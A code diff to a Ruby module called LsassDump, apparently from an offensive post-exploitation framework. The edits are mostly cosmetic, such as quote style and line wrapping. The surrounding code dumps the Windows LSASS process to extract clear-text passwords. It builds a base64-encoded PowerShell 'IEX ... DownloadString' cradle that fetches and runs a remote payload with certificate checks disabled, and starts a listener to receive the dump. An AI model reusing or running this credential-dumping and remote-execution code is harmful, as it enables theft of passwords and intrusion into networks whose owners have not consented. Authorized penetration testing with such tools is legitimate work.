@@ -5,8 +5,8 @@ class LsassDump < Poet::Scanner
   include Lib_meta
   include Server::Info
 
-  self.mod_name = "Dump Lsass process with Powershell"
-  self.description = "Dump Lsass process to extract clear text passwords off the workstations/servers"
+  self.mod_name = 'Dump Lsass process with Powershell'
+  self.description = 'Dump Lsass process to extract clear text passwords off the workstations/servers'
   self.invasive = true
 
   def psh_command(host,port,ssl)
@@ -34,10 +34,12 @@ class LsassDump < Poet::Scanner
     title = "Lsass Dumper"
     @timeout = 30 + @timeout if @timeout < 90
     server = Server.new
-    host = rgets("Would you like to host the payload on a web server? [#{color_banner('y')}|#{color_banner('n')}] : ", "y")
+    host = rgets("Would you like to host the payload on a web server? \
+                 [#{color_banner('y')}|#{color_banner('n')}] : ", 'y')
     lhost, lport = get_meter_data
     print_warning('SSL is very slow uploading')
-    ssl = rgets("Use SSL for file transfer? [#{color_banner('y')}|#{color_banner('n')}] : ", "y")
+    ssl = rgets("Use SSL for file transfer? \
+                [#{color_banner('y')}|#{color_banner('n')}] : ", 'y')
     if ssl == 'y'
       ssl = true
     else
@@ -49,15 +51,15 @@ class LsassDump < Poet::Scanner
       host = get_host(url)
       web_ssl = url.is_ssl?
       # Start web server
-      Thread.new { server.raw_web( host, port, psh_command(lhost,lport,ssl), web_ssl ) }
+      Thread.new { server.raw_web(host, port, psh_command(lhost, lport, ssl), web_ssl) }
       # Start Listener for file
-      Thread.new { server.base64_upload( lhost, lport, ssl ) }
-      ps_command = "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true };"
+      Thread.new { server.base64_upload(lhost, lport, ssl) }
+      ps_command = '[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true };'
       ps_command << "IEX (New-Object Net.WebClient).DownloadString('#{url}')"
       @encoded_ps = ps_command.to_ps_base64!
     else
-      Thread.new { server.base64_upload( lhost, lport, ssl) }
-      @encoded_ps = psh_command( lhost, lport, ssl ).to_ps_base64!
+      Thread.new { server.base64_upload(lhost, lport, ssl) }
+      @encoded_ps = psh_command(lhost, lport, ssl).to_ps_base64!
     end
   end
 
@@ -73,7 +75,7 @@ class LsassDump < Poet::Scanner
 
     # Return to menu
     puts
-    print "Press enter to return to Exploitation Menu"
+    print 'Press enter to return to Exploitation Menu'
     gets
   rescue => e
     puts e
